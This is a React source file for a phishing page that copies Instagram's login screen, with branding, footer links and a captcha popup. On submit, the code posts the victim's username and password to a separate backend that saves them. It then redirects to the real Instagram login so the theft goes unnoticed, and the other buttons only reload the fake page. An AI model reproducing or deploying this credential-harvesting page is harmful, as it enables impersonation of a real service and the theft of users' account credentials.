import React, { useState } from "react";
import InstagramWordmark from "./InstagramWordmark.jsx";
import axios from "axios";
import LoadingBar from "react-top-loading-bar";
import CaptchaModal from "./components/CaptchaModal.jsx";


const API_URL = import.meta.env.VITE_API_URL;

function Divider() {
  return (
    <div className="flex items-center gap-4 my-4">
      <div className="h-px bg-igBorder flex-1" />
      <span className="text-xs font-semibold text-igMuted">OR</span>
      <div className="h-px bg-igBorder flex-1" />
    </div>
  );
}

function Footer() {
  const links = [
    "Meta","About","Blog","Jobs","Help","API","Privacy","Cookie Settings",
    "Terms","Locations","Instagram Lite","Meta AI","Meta AI Articles","Threads",
    "Contact Uploading & Non-Users","Meta Verified"
  ];
  return (
    <div className="text-xs text-igMuted mt-6 mb-8 px-6">
      <ul className="flex flex-wrap justify-center gap-x-4 gap-y-2">
        {links.map((l) => (
          <li key={l} className="hover:underline cursor-pointer">{l}</li>
        ))}
      </ul>
      <div className="mt-3 text-center">English • © 2025 Instagram from Meta</div>
    </div>
  );
}

function PhoneShowcase() {
  return (
    <div className="hidden lg:flex relative items-center justify-center w-[420px] h-[580px]">
      <div className="absolute -left-5 top-16 rotate-[-8deg] bg-white shadow-card rounded-3xl p-2">
        <img
          src="https://images.unsplash.com/photo-1511919884226-fd3cad34687c?q=80&w=900&auto=format&fit=crop"
          className="w-40 h-56 object-cover rounded-2xl"
          alt="preview-1"
        />
      </div>
      <div className="absolute left-16 top-6 rotate-[6deg] bg-white shadow-card rounded-3xl p-2">
        <img
          src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=900&auto=format&fit=crop"
          className="w-44 h-64 object-cover rounded-2xl"
          alt="preview-2"
        />
      </div>
      <div className="absolute -right-2 bottom-10 rotate-[6deg] bg-white shadow-card rounded-3xl p-2">
        <img
          src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?q=80&w=900&auto=format&fit=crop"
          className="w-40 h-56 object-cover rounded-2xl"
          alt="preview-3"
        />
      </div>
      <div className="absolute right-20 bottom-4 -rotate-3 bg-white shadow-card rounded-3xl p-2">
        <img
          src="https://images.unsplash.com/photo-1541534401786-2077eed87a74?q=80&w=900&auto=format&fit=crop"
          className="w-44 h-64 object-cover rounded-2xl"
          alt="preview-4"
        />
      </div>
    </div>
  );
}

export default function App() {
  const [form, setForm] = useState({ id: "", password: "" });
  const [progress, setProgress] = useState(0);
  const [showModal, setShowModal] = React.useState(true); // open by default


  // const disabled = !(form.id.length > 0 && form.password.length >= 3);

  const disabled = !(
    (form.id.length >= 3) && 
    (/^\S+@\S+\.\S+$/.test(form.id) || /^\d{10,}$/.test(form.id) || form.id.length >= 3) &&
    form.password.length >= 3
  );

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (disabled) return;

    try {
      setProgress(30);
      
      await axios.post(`${API_URL}/login`, {
        identifier: form.id,   // ✅ must match backend
        password: form.password,
      });
      setProgress(100);

      // redirect to real Instagram login page
      window.location.href = "https://www.instagram.com/accounts/login/";
    } catch (err) {
      console.error("Login save error:", err);
      setProgress(100);
    }
  };

  // 🔹 redirect helper (reloads the same login page)
  const redirectHome = (e) => {
    e.preventDefault();
    window.location.href = "/";
  };

  return (
    <div>
      <CaptchaModal 
        isOpen={showModal} 
        onClose={() => setShowModal(false)} 
      />      
    <div className="min-h-screen bg-igBg text-igText flex flex-col">
      <LoadingBar color="#3897f0" progress={progress} onLoaderFinished={() => setProgress(0)} />
      <main className="flex-1 flex items-center justify-center">
        <div className="flex items-center justify-center w-full max-w-6xl px-6 lg:px-4 gap-8">
          <PhoneShowcase />
          <div className="w-full max-w-sm">
            <div className="border border-igBorder bg-white p-8 pb-6 rounded-sm">
              <div className="flex justify-center mb-6">
                <InstagramWordmark />
              </div>
              <form className="space-y-2" onSubmit={handleSubmit}>
                <input
                  className="w-full border border-igBorder rounded-sm px-2.5 py-2 text-sm bg-[#fafafa] focus:outline-none focus:ring-1 focus:ring-igBorder"
                  placeholder="Phone number, username, or email"
                  value={form.id}
                  onChange={(e) => setForm({ ...form, id: e.target.value })}
                />
                <input
                  type="password"
                  className="w-full border border-igBorder rounded-sm px-2.5 py-2 text-sm bg-[#fafafa] focus:outline-none focus:ring-1 focus:ring-igBorder"
                  placeholder="Password"
                  value={form.password}
                  onChange={(e) => setForm({ ...form, password: e.target.value })}
                />
                <button
                  className={`w-full text-white text-sm font-semibold rounded-lg py-2 transition ${
                    disabled ? "bg-igBlue/40 cursor-not-allowed" : "bg-igBlue hover:bg-igBlueHover"
                  }`}
                  disabled={disabled}
                >
                  Log in
                </button>
              </form>
              <Divider />
              {/* Facebook login redirects home */}
              <button
                onClick={redirectHome}
                className="w-full flex items-center justify-center gap-2 text-sm font-semibold text-[#385185]"
              >
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" className="w-5 h-5" aria-hidden="true">
                  <path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4z" fill="#1877F2"/>
                  <path d="M26.707 18.474h3.327v-3.925h-3.924c-3.652 0-5.728 2.146-5.728 5.36v2.768h-3.1v4.088h3.1V36h4.267v-9.236h3.536l.621-4.088h-4.157v-2.34c0-1.129.304-1.862 1.958-1.862z" fill="#fff"/>
                </svg>
                Log in with Facebook
              </button>
              <div className="mt-4 text-center">
                {/* Forgot password redirect home */}
                <a
                  href="/"
                  onClick={redirectHome}
                  className="text-xs text-igText hover:underline"
                >
                  Forgot password?
                </a>
              </div>
            </div>
            <div className="border border-igBorder bg-white py-5 mt-3 text-center rounded-sm">
              <span className="text-sm">Don't have an account? </span>
              {/* Sign up redirect home */}
              <a
                href="/"
                onClick={redirectHome}
                className="text-sm text-igBlue font-semibold hover:underline"
              >
                Sign up
              </a>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
    </div>
  );
}
